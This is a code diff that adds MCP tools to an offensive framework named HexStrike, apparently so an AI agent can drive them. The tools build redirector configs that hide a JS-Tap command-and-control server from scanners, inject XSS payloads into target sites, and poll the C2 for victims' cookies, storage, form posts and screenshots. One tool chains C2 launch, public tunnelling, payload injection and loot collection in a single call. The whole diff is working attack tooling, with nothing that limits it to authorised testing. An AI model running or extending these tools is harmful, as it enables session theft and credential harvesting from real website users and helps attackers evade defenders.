@@ -5777,6 +5777,515 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
             ),
         }
 
+    # =========================================================================
+    # REDIRECTOR TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def redirector_generate(
+        c2_url: str,
+        domain: str,
+        server_type: str = "nginx",
+        filter_bots: bool = True,
+        allowed_paths: str = "",
+        ssl_cert: str = "/etc/ssl/certs/redirector.crt",
+        ssl_key: str = "/etc/ssl/private/redirector.key",
+        output_dir: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Generate an Apache or Nginx redirector config to front the JS-Tap C2.
+
+        The redirector sits on a VPS with a clean domain. Legitimate browser
+        traffic is proxied to the C2 (tunnel URL or direct IP). Scanners and
+        bots see a 403 and never touch the real infrastructure.
+
+        Args:
+            c2_url:        Full URL of the C2 to proxy to (e.g. tunnel public_url)
+            domain:        Domain name for the redirector VPS (e.g. cdn-static.io)
+            server_type:   'nginx' or 'apache'
+            filter_bots:   Block known scanner/bot user-agents (default: True)
+            allowed_paths: Comma-separated URI prefixes to allow; all others → 403
+                           (e.g. '/js/,/api/' — leave empty to allow everything)
+            ssl_cert:      Path to SSL cert on the redirector server
+            ssl_key:       Path to SSL private key on the redirector server
+            output_dir:    If set, write config file here and return the path
+
+        Returns:
+            Generated config text, filename, and optional saved path
+        """
+        paths = [p.strip() for p in allowed_paths.split(",") if p.strip()] or None
+        data: Dict[str, Any] = {
+            "c2_url": c2_url,
+            "domain": domain,
+            "server_type": server_type,
+            "filter_bots": filter_bots,
+            "ssl_cert": ssl_cert,
+            "ssl_key": ssl_key,
+        }
+        if paths:
+            data["allowed_paths"] = paths
+        if output_dir:
+            data["output_dir"] = output_dir
+
+        logger.info(
+            f"{HexStrikeColors.ELECTRIC_PURPLE}🔀 Generating {server_type} redirector: "
+            f"{domain} → {c2_url}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/redirector/generate", data)
+
+        if result.get("success"):
+            saved = f" → saved to {result['path']}" if result.get("path") else ""
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Redirector config generated{saved}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Redirector failed: {result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    # =========================================================================
+    # BEACON LISTENER TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def beacon_start(
+        jstap_url: str,
+        username: str,
+        password: str,
+        interval: int = 10,
+    ) -> Dict[str, Any]:
+        """
+        Authenticate to the JS-Tap portal and start polling for active clients.
+
+        Runs a background thread that polls /api/getClients every *interval*
+        seconds, resolves each new event to its full loot record (cookies,
+        localStorage, form posts, XHR calls, screenshots, etc.), and caches
+        everything for retrieval via beacon_list_clients / beacon_get_loot.
+
+        Args:
+            jstap_url: Base URL of the JS-Tap C2 portal (e.g. https://10.0.0.1:8444)
+            username:  JS-Tap portal username
+            password:  JS-Tap portal password
+            interval:  Polling interval in seconds (min 5, default 10)
+
+        Returns:
+            Confirmation with polling interval and start time
+        """
+        data = {
+            "jstap_url": jstap_url,
+            "username": username,
+            "password": password,
+            "interval": interval,
+        }
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}📡 Starting beacon listener → {jstap_url} "
+            f"(every {interval}s){HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/beacon/start", data)
+
+        if result.get("success"):
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Beacon listener running | "
+                f"polling every {result.get('poll_interval')}s{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Beacon start failed: "
+                f"{result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    @mcp.tool()
+    def beacon_stop() -> Dict[str, Any]:
+        """
+        Stop the JS-Tap beacon polling loop.
+
+        Returns:
+            Total polls run and number of unique clients seen
+        """
+        logger.info(
+            f"{HexStrikeColors.CRIMSON}🛑 Stopping beacon listener{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/beacon/stop", {})
+        if result.get("success"):
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ Beacon stopped | "
+                f"{result.get('total_polls')} polls | "
+                f"{result.get('clients_seen')} clients{HexStrikeColors.RESET}"
+            )
+        return result
+
+    @mcp.tool()
+    def beacon_list_clients(only_new: bool = False) -> Dict[str, Any]:
+        """
+        Return all JS-Tap clients currently in the beacon cache.
+
+        Each client entry includes: id, IP, browser, platform, firstSeen,
+        lastSeen, isStarred, hasJobs, and fingerprint.
+
+        Args:
+            only_new: If True, return only clients seen since the last call
+                      to this tool (clears the new-client queue on read)
+
+        Returns:
+            client_count, clients list, poll count, uptime
+        """
+        params = "?only_new=true" if only_new else ""
+        logger.info(
+            f"{HexStrikeColors.NEON_BLUE}👥 Listing beacon clients "
+            f"({'new only' if only_new else 'all'}){HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_get(f"api/tools/beacon/clients{params}")
+
+        count = result.get("client_count", 0)
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}✅ {count} client(s) in cache{HexStrikeColors.RESET}"
+        )
+        return result
+
+    @mcp.tool()
+    def beacon_get_loot(client_id: str) -> Dict[str, Any]:
+        """
+        Retrieve all resolved loot for a specific JS-Tap client.
+
+        Loot is bucketed by event type:
+          COOKIE, LOCALSTORAGE, SESSIONSTORAGE, USERINPUT, FORMPOST,
+          XHRAPICALL, FETCHAPICALL, URLVISITED, SCREENSHOT, HTML, CUSTOMEXFIL
+
+        Args:
+            client_id: JS-Tap client ID (from beacon_list_clients)
+
+        Returns:
+            client metadata, loot_count, loot_by_type dict
+        """
+        logger.info(
+            f"{HexStrikeColors.FIRE_RED}💰 Fetching loot for client {client_id}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_get(f"api/tools/beacon/loot/{client_id}")
+
+        if result.get("success"):
+            loot_count = result.get("loot_count", 0)
+            types = list(result.get("loot_by_type", {}).keys())
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ {loot_count} loot items | "
+                f"types: {', '.join(types)}{HexStrikeColors.RESET}"
+            )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ {result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    # =========================================================================
+    # XSS AUTO-INJECT TOOLS
+    # =========================================================================
+
+    @mcp.tool()
+    def xss_auto_inject(
+        target_url: str,
+        payload: str,
+        injection_point: str = "url_param",
+        param_name: str = "q",
+        method: str = "GET",
+        extra_params: str = "",
+        headers: str = "",
+        cookies: str = "",
+        verify_ssl: bool = False,
+        timeout: int = 15,
+    ) -> Dict[str, Any]:
+        """
+        Automatically deliver an XSS payload to a discovered injection point.
+
+        Use this after nuclei/ffuf/manual recon identifies a vulnerable parameter.
+        The injector makes the HTTP request and reports whether the payload was
+        reflected in the response (quick indicator of successful injection).
+
+        Injection surfaces:
+          url_param  — inject into a URL query parameter (GET)
+          form_field — submit a form with payload in a field (GET or POST)
+          header     — send payload in a custom HTTP header
+
+        Args:
+            target_url:      Target URL (e.g. https://target.com/search)
+            payload:         XSS payload to inject (use jstap_generate_payload first)
+            injection_point: 'url_param', 'form_field', or 'header'
+            param_name:      Parameter/field/header name to inject into
+            method:          HTTP method — 'GET' or 'POST'
+            extra_params:    Additional form/URL params as 'key=val,key2=val2'
+            headers:         Extra request headers as 'Header: value,Header2: value2'
+            cookies:         Session cookies as 'name=value,name2=value2'
+            verify_ssl:      Verify SSL certificate (default: False)
+            timeout:         Request timeout in seconds
+
+        Returns:
+            status_code, response_length, payload_reflected, injected_url, curl command
+        """
+        data: Dict[str, Any] = {
+            "target_url": target_url,
+            "payload": payload,
+            "injection_point": injection_point,
+            "param_name": param_name,
+            "method": method.upper(),
+            "verify_ssl": verify_ssl,
+            "timeout": timeout,
+        }
+
+        def parse_kv(s: str) -> Dict[str, str]:
+            out: Dict[str, str] = {}
+            for pair in s.split(","):
+                if "=" in pair:
+                    k, _, v = pair.strip().partition("=")
+                    out[k.strip()] = v.strip()
+            return out
+
+        def parse_headers_str(s: str) -> Dict[str, str]:
+            out: Dict[str, str] = {}
+            for pair in s.split(","):
+                if ":" in pair:
+                    k, _, v = pair.strip().partition(":")
+                    out[k.strip()] = v.strip()
+            return out
+
+        if extra_params:
+            data["extra_params"] = parse_kv(extra_params)
+        if headers:
+            data["headers"] = parse_headers_str(headers)
+        if cookies:
+            data["cookies"] = parse_kv(cookies)
+
+        logger.info(
+            f"{HexStrikeColors.SCARLET}💉 Auto-inject [{injection_point}:{param_name}] "
+            f"→ {target_url}{HexStrikeColors.RESET}"
+        )
+        result = hexstrike_client.safe_post("api/tools/autoinject/xss", data)
+
+        if result.get("success"):
+            reflected = result.get("payload_reflected", False)
+            color = HexStrikeColors.SUCCESS if reflected else HexStrikeColors.WARNING
+            logger.info(
+                f"{color}{'✅' if reflected else '⚠️ '} HTTP {result.get('status_code')} | "
+                f"{result.get('hint', '')}{HexStrikeColors.RESET}"
+            )
+            if reflected:
+                logger.info(
+                    f"{HexStrikeColors.HIGHLIGHT_RED} REFLECTED — payload live in response {HexStrikeColors.RESET}"
+                )
+        else:
+            logger.error(
+                f"{HexStrikeColors.ERROR}❌ Injection failed: {result.get('error')}{HexStrikeColors.RESET}"
+            )
+        return result
+
+    # =========================================================================
+    # FULL-CHAIN COMBO TOOL
+    # =========================================================================
+
+    @mcp.tool()
+    def xss_full_chain(
+        target_url: str,
+        injection_point: str = "url_param",
+        param_name: str = "q",
+        method: str = "GET",
+        extra_params: str = "",
+        headers: str = "",
+        cookies: str = "",
+        payload_mode: str = "trap",
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_url: str = "",
+        jstap_username: str = "",
+        jstap_password: str = "",
+        beacon_interval: int = 10,
+    ) -> Dict[str, Any]:
+        """
+        Full XSS attack chain: C2 → tunnel → payload → inject → beacon.
+
+        Orchestrates the entire operation in one call:
+          1. Start JS-Tap C2 (if not already running)
+          2. Start tunnel to get a public URL (if jstap_url not provided)
+          3. Generate JS-Tap payload using the public URL
+          4. Inject payload into the target
+          5. Start beacon listener to surface incoming loot
+
+        Use this when nuclei/ffuf has already confirmed an XSS vector and
+        you want to go from discovery to active collection in one step.
+
+        Args:
+            target_url:         Vulnerable target URL
+            injection_point:    'url_param', 'form_field', or 'header'
+            param_name:         Vulnerable parameter name
+            method:             HTTP method 'GET' or 'POST'
+            extra_params:       Other form/URL params as 'key=val,key2=val2'
+            headers:            Extra request headers as 'Header: value,...'
+            cookies:            Session cookies as 'name=value,...'
+            payload_mode:       JS-Tap mode: 'trap' or 'implant'
+            tunnel_provider:    'auto', 'ngrok', 'cloudflared', 'serveo'
+            tunnel_auth_token:  ngrok auth token (optional)
+            jstap_port:         Local JS-Tap port (default 8444)
+            jstap_url:          Skip tunnel — use this JS-Tap URL directly
+            jstap_username:     JS-Tap portal username (for beacon listener)
+            jstap_password:     JS-Tap portal password (for beacon listener)
+            beacon_interval:    Beacon polling interval in seconds
+
+        Returns:
+            Combined result: public_url, payload used, injection outcome,
+            beacon status, and next_steps guidance
+        """
+        chain: Dict[str, Any] = {}
+
+        logger.info(
+            f"{HexStrikeColors.HACKER_RED}⛓️  Starting full XSS chain against "
+            f"{target_url}{HexStrikeColors.RESET}"
+        )
+
+        # ── Step 1+2: C2 + tunnel (or use provided jstap_url) ────────────────
+        if jstap_url:
+            public_url = jstap_url.rstrip("/")
+            chain["c2"] = {"skipped": True, "public_url": public_url}
+        else:
+            launch = hexstrike_client.safe_post(
+                "api/tools/jstap/start",
+                {"port": jstap_port, "use_gunicorn": False},
+            )
+            tunnel_data: Dict[str, Any] = {
+                "local_port": jstap_port,
+                "provider": tunnel_provider,
+            }
+            if tunnel_auth_token:
+                tunnel_data["auth_token"] = tunnel_auth_token
+            tunnel = hexstrike_client.safe_post("api/tools/tunnel/start", tunnel_data)
+            public_url = tunnel.get("public_url", "")
+            chain["c2"] = launch
+            chain["tunnel"] = tunnel
+
+            if not public_url:
+                return {
+                    "success": False,
+                    "stage": "tunnel",
+                    "chain": chain,
+                    "error": f"Tunnel failed: {tunnel.get('error')}",
+                }
+            logger.info(
+                f"{HexStrikeColors.SUCCESS}✅ C2 + tunnel up: {public_url}{HexStrikeColors.RESET}"
+            )
+
+        # ── Step 3: Generate payload ──────────────────────────────────────────
+        payload_result = hexstrike_client.safe_post(
+            "api/tools/jstap/payload",
+            {"server_url": public_url, "mode": payload_mode},
+        )
+        chain["payload_generation"] = payload_result
+        payloads = payload_result.get("payloads", {})
+
+        # Pick best variant for the injection surface
+        if injection_point == "url_param":
+            payload = payloads.get("img_onerror") or next(iter(payloads.values()), "")
+        else:
+            payload = payloads.get("script_tag") or next(iter(payloads.values()), "")
+
+        if not payload:
+            return {
+                "success": False,
+                "stage": "payload_generation",
+                "chain": chain,
+                "error": "Payload generation returned no variants",
+            }
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}✅ Payload ready ({len(payload)} chars){HexStrikeColors.RESET}"
+        )
+
+        # ── Step 4: Inject ────────────────────────────────────────────────────
+        inject_data: Dict[str, Any] = {
+            "target_url": target_url,
+            "payload": payload,
+            "injection_point": injection_point,
+            "param_name": param_name,
+            "method": method.upper(),
+            "verify_ssl": False,
+        }
+
+        def _parse_kv(s: str) -> Dict[str, str]:
+            out: Dict[str, str] = {}
+            for pair in s.split(","):
+                if "=" in pair:
+                    k, _, v = pair.strip().partition("=")
+                    out[k.strip()] = v.strip()
+            return out
+
+        def _parse_hdr(s: str) -> Dict[str, str]:
+            out: Dict[str, str] = {}
+            for pair in s.split(","):
+                if ":" in pair:
+                    k, _, v = pair.strip().partition(":")
+                    out[k.strip()] = v.strip()
+            return out
+
+        if extra_params:
+            inject_data["extra_params"] = _parse_kv(extra_params)
+        if headers:
+            inject_data["headers"] = _parse_hdr(headers)
+        if cookies:
+            inject_data["cookies"] = _parse_kv(cookies)
+
+        inject_result = hexstrike_client.safe_post("api/tools/autoinject/xss", inject_data)
+        chain["injection"] = inject_result
+        reflected = inject_result.get("payload_reflected", False)
+
+        if reflected:
+            logger.info(
+                f"{HexStrikeColors.HIGHLIGHT_RED} REFLECTED XSS confirmed at {target_url} {HexStrikeColors.RESET}"
+            )
+        else:
+            logger.info(
+                f"{HexStrikeColors.WARNING}⚠️  Payload sent (HTTP {inject_result.get('status_code')}) "
+                f"— not reflected (may be stored){HexStrikeColors.RESET}"
+            )
+
+        # ── Step 5: Beacon listener ───────────────────────────────────────────
+        beacon_result: Dict[str, Any] = {}
+        if jstap_username and jstap_password:
+            beacon_result = hexstrike_client.safe_post(
+                "api/tools/beacon/start",
+                {
+                    "jstap_url": public_url,
+                    "username": jstap_username,
+                    "password": jstap_password,
+                    "interval": beacon_interval,
+                },
+            )
+            chain["beacon"] = beacon_result
+            if beacon_result.get("success"):
+                logger.info(
+                    f"{HexStrikeColors.SUCCESS}✅ Beacon listener active "
+                    f"(every {beacon_interval}s){HexStrikeColors.RESET}"
+                )
+        else:
+            chain["beacon"] = {
+                "skipped": True,
+                "reason": "No JS-Tap credentials — provide jstap_username + jstap_password",
+            }
+
+        return {
+            "success": True,
+            "public_url": public_url,
+            "payload_used": payload,
+            "payload_reflected": reflected,
+            "injection_url": inject_result.get("injected_url", target_url),
+            "beacon_running": beacon_result.get("success", False),
+            "chain": chain,
+            "next_steps": (
+                f"{'✅ Reflected XSS confirmed' if reflected else '⚠️  Payload sent — wait for victim'}. "
+                f"Victims beacon to {public_url}. "
+                + (
+                    "Use beacon_list_clients + beacon_get_loot to retrieve sessions."
+                    if beacon_result.get("success")
+                    else "Start beacon with beacon_start when ready."
+                )
+            ),
+        }
+
     return mcp
 
 def parse_args():
